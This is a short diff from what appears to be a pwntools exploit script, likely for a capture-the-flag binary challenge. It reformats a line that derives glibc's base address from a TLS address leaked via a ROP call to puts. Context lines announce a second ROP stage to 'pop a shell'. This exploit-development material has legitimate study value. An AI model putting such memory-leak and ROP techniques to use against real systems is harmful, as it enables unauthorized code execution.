@@ -31,7 +31,7 @@ p.sendline(b'C'*4)                                                  # ROP's thir
 p.recv(8)                                                           # ROP's puts, with rdi=&_IO_stdfile_0_lock
 tls_base_addr = u64(p.recv(6).ljust(8, b'\x00'))
 log.info(f"tls base address: {hex(tls_base_addr)}")
-glibc_base_addr = tls_base_addr + 0x28c0
+glibc_base_addr = tls_base_addr+0x28c0
 log.info(f"glibc base address: {hex(glibc_base_addr)}")
 
 # Stage 2: ROP to pop a shell
